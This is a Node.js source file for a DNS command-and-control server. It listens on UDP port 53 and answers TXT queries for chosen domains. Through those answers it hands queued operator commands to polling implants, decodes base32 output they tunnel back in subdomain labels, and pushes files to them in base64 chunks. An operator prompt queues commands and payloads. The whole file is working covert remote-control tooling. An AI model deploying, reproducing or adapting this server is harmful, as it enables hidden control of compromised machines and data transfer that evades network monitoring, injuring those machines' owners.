const dgram = require('dgram');
const Buffer = require('buffer').Buffer;
const readline = require('readline');
const fs = require('fs');
const path = require('path');

const host = '0.0.0.0';
const port = 53;
const commandQueue = [];
const payloads = [];

const length_descending = (a, b) => b.length - a.length;
const domains = process.argv.length > 2 ? process.argv.slice(2).sort(length_descending) : [];
const sock = dgram.createSocket('udp4');

function bitSlice(byte, offset, len) {
  return (byte >>> (8 - offset - len)) & ~(0xff << len);
}

function parseRequest(buffer) {
  const query = {
    header: {},
    questions: [],
  };

  query.header.id = buffer.subarray(0, 2);

  let tmp = buffer.subarray(2, 3).toString('binary', 0, 1).charCodeAt(0);
  query.header.qr = bitSlice(tmp, 0, 1);
  query.header.opcode = bitSlice(tmp, 1, 4);
  query.header.aa = bitSlice(tmp, 5, 1);
  query.header.tc = bitSlice(tmp, 6, 1)
  query.header.rd = bitSlice(tmp, 7, 1);

  tmp = buffer.subarray(3, 4).toString('binary', 0, 1).charCodeAt(0);
  query.header.ra = bitSlice(tmp, 0, 1);
  query.header.z = bitSlice(tmp, 1, 3);
  query.header.rcode = bitSlice(4, 4);

  query.header.qdcount = buffer.subarray(4, 6);
  query.header.ancount = buffer.subarray(6, 8);
  query.header.nscount = buffer.subarray(8, 10);
  query.header.arcount = buffer.subarray(10, 12);

  let idx = 12;
  let question = {};
  let domain = '';
  let questionsLeft = query.header.qdcount.readUInt16BE();

  while (idx < buffer.length - 4) {
    const sz = buffer[idx];
    if (sz == 0) {
      question.qname = domain.substr(1);
      question.qtype = buffer.subarray(idx + 1, idx + 3);
      question.qclass = buffer.subarray(idx + 3, idx + 5);
      query.questions.push(question);

      if (--questionsLeft == 0) break;
      question = {};
      domain = '';
      idx += 5;
    } else {
      domain += '.' + buffer.toString('binary', idx + 1, idx + sz + 1);
      idx += sz + 1;
    }
  }

  return query;
}

function buildResponse(query, qn, text) {
  const answer = {
    header: {},
    question: query.questions[qn],
    rr: {
        qname: query.questions[qn].qname,
        qtype: query.questions[qn].qtype,
        qclass: query.questions[qn].qclass,
        ttl: 0,
        rdata: text,
        rdlen: text.length,
      },
  };

  answer.header.id = query.header.id;
  answer.header.qr = 1;
  answer.header.opcode = query.header.opcode;
  answer.header.aa = 1;
  answer.header.tc = 0;
  answer.header.rd = query.header.rd;
  answer.header.ra = 0;
  answer.header.z = 0;
  answer.header.rcode = 0;

  answer.header.qdcount = query.questions.length;
  answer.header.ancount = 1;
  answer.header.nscount = 0;
  answer.header.arcount = 0;

  return buildResponseBuffer(answer);
}

function wrapQName(str, offset, ptrs = {}) {
  str = str.toLowerCase();
  if (str in ptrs) return [0xc0, ptrs[str]];
  ptrs[str] = offset;

  const selectors = str.split('.');
  const buffer = [];

  for (const selector of selectors) {
    buffer.push(selector.length & 0x3f);
    for (let i = 0; i < selector.length; i++) {
      buffer.push(selector.charCodeAt(i));
    }
  }

  buffer.push(0x00);
  return buffer;
}

function buildResponseBuffer(answer) {
  const pointerTable = {};
  const wrappedName = Buffer.from(wrapQName(answer.question.qname, 12, pointerTable));
  const qnsz = wrappedName.length;
  const sz = 16 + qnsz;
  const buffer = Buffer.alloc(sz);

  answer.header.id.copy(buffer, 0, 0, 2);
  buffer[2] = answer.header.qr << 7 | answer.header.opcode << 3 | answer.header.aa << 2 | answer.header.tc << 1 | answer.header.rd;
  buffer[3] = answer.header.ra << 7 | answer.header.z << 4 | answer.header.rcode;

  buffer.writeUInt16BE(answer.header.qdcount, 4);
  buffer.writeUInt16BE(answer.header.ancount, 6);
  buffer.writeUInt16BE(answer.header.nscount, 8);
  buffer.writeUInt16BE(answer.header.arcount, 10);

  wrappedName.copy(buffer, 12, 0, qnsz);
  answer.question.qtype.copy(buffer, 12 + qnsz, 0, 2);
  answer.question.qclass.copy(buffer, 14 + qnsz, 0, 2);

  const rr = wrapQName(answer.rr.qname, sz, pointerTable);

  const qtype = answer.rr.qtype.readUInt16BE();
  rr.push(qtype >> 8 & 0xff);
  rr.push(qtype & 0xff);
  const qclass = answer.rr.qclass.readUInt16BE();
  rr.push(qclass >> 8 & 0xff);
  rr.push(qclass & 0xff);
  const ttl = answer.rr.ttl;
  rr.push(ttl >> 24 & 0xff);
  rr.push(ttl >> 16 & 0xff);
  rr.push(ttl >> 8 & 0xff);
  rr.push(ttl & 0xff);
  const rdlength = answer.rr.rdlen + 1;
  rr.push(rdlength >> 8 & 0xff);
  rr.push(rdlength & 0xff);
  rr.push(rdlength - 1 & 0xff);

  const rrdata = rr.concat(answer.rr.rdata.split('').map(c => c.charCodeAt(0)));
  return Buffer.concat([buffer, Buffer.from(rrdata)]);
}

sock.on('message', function(req, rinfo) {
  const query = parseRequest(req);
  for (let i = 0; i < query.questions.length; i++) {
    if (query.questions[i].qtype.readUInt16BE() != 16) continue; // only answer TXT queries

    const qname = query.questions[i].qname.toLowerCase();
    let recognized = false, domain;

    for (domain of domains) {
      domain = domain.toLowerCase();
      if (qname.endsWith('.' + domain)) {
        recognized = true;
        break;
      }
    }
    if (!recognized) continue;

    const selector = qname.substr(0, qname.indexOf('.' + domain)).toLowerCase();
    const overhead = 32, max_sz = 512, max_txt = 255;

    let resp;

    if (selector == "asuh") {
      if (commandQueue.length < 1) {
        resp = 'nop';
      } else {
        resp = commandQueue.shift();
        while (resp.length > max_txt || resp.length + domain.length + overhead > max_sz) {
          console.log('\n[WARN] Queued command is too long; skipping "', resp, '"');
          rl.prompt(true);
          resp = commandQueue.length > 0 ? commandQueue.shift() : 'nop';
        }

        if (resp.startsWith('payload ')) {
          const pd = parseInt(resp.substr(8));

          if (payloads[pd].chunks.length < 1) {
            const pdata = payloads[pd].data;
            const chunk_max = max_txt; // I have not edge case tested this math
            const n_chunks = Math.ceil(pdata.length / chunk_max);

            for (let j = 0; j < n_chunks; j++) {
              payloads[pd].chunks[j] = pdata.substr(j*chunk_max, chunk_max);
            }
          }

          const pobj = payloads[pd];
          resp = 'payload ' + pobj.filename + ' ' + pd + ' ' + pobj.chunks.length;
        }
      }
    } else {
      const output = unpack(selector);
      if (!output) {
        console.log('\n[WARN] Unable to decode selector:', selector, "; tampering detected");
        rl.prompt(true);
        return;
      }
      if (output === '\xde\xadDN') {
        rl.prompt(true);
        resp = 'ok';
      } else if (output === '\xde\xadPD') {
        console.log('DONE');
        rl.prompt(true);
        resp = 'ok';
      } else if (output.startsWith('\xde\xadPL')) {
        const args = output.split(' ');
        if (args.length < 3) {
          console.log('\n[WARN] Malformed payload chunk request; tampering detected');
          rl.prompt(true);
          return;
        }

        try {
          const pd = parseInt(args[1]);
          if (pd > payloads.length) {
            console.log('\n[WARN] Request for nonexistent payload; tampering detected');
            rl.prompt(true);
            return;
          }
          const chunknum = parseInt(args[2]);
          resp = payloads[pd].chunks[chunknum];
        } catch (e) {
          console.log('\n[WARN] Malformed payload chunk request; tampering detected');
          rl.prompt(true);
          return;
        }
      } else {
        console.log(output);
        resp = 'ok';
      }
    }

    const responseBuffer = buildResponse(query, i, resp);
    sock.send(responseBuffer, 0, responseBuffer.length, rinfo.port, rinfo.address, function(e) {
      if (e) console.warn('Error Sending Response:', e);
    });
  }
});

function unpack(s) {
  const chunks = s.split('.').reverse().map(c => decode(c));
  return chunks.join('');
}

function decode(s) {
  const len = s.length;
  const apad = 'abcdefghijklmnopqrstuvwxy1234567z';
  let v,x,r=0,bits=0,c,o='';

  for(i=0;i<len;i+=1) {
    v = apad.indexOf(s.charAt(i));
    if (v < 0 || v > 32) return false;
    if (v == 32) continue;

    x = (x << 5) | v;
    bits += 5;
    if (bits >= 8) {
      c = (x >> (bits - 8)) & 0xff;
      o = o + String.fromCharCode(c);
      bits -= 8;
    }
  }
  if (bits>0) {
    c = ((x << (8 - bits)) & 0xff) >> (8 - bits);

    if (c!==0) {
      o = o + String.fromCharCode(c);
    }
  }

  return o;
}

sock.on('error', function(e) {
  console.error('Socket Error:', e);
});

sock.bind(port, host);
console.log('Bound on '+host+':'+port);
console.log('Serving domains: ', domains);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true,
  prompt: '\x1b[1;37m[0xdeadc0de]\x1b[0m ',
});

rl.on('line', function (cmd) {
  cmd = cmd.trim();
  if (cmd == 'payload') {
    console.log('Usage: payload <filename>|<payload number>');
    console.log('Use "payloads" to see current stored payloads.');
    rl.prompt();
    return;
  } else if (cmd == 'payloads') {
    console.log('Stored payloads:');
    for (let i = 0; i < payloads.length; i++) {
      console.log(i+':', payloads[i].filename);
    }
    rl.prompt();
    return;
  } else if (cmd.startsWith('payload ')) {
    const arg = cmd.substr(8);
    let pd = parseInt(arg);
    if (pd >= payloads.length) {
      console.log('A payload with this number does not yet exist.');
      rl.prompt();
      return;
    }
    if (!Number.isInteger(pd)) {
      pd = payloads.length;
      try {
        const data = fs.readFileSync(arg);

        payloads.push({
          filename: path.basename(arg),
          data: data.toString('base64'),
          chunks: [],
        });
      } catch (e) {
        console.log('Could not read file', arg);
        rl.prompt();
        return;
      }
    }
    commandQueue.push('payload '+pd);
  } else {
    commandQueue.push(cmd);
  }
//  rl.prompt();
});

rl.on('close', function () {
  console.log('Quitting.');
  sock.close();
});

rl.on('SIGINT', function () {
  console.log('^C');
  rl.line = '';
  rl.cursor = 0;
  rl.prompt();
});

console.log('[INFO] Command interpreter started')
rl.prompt();
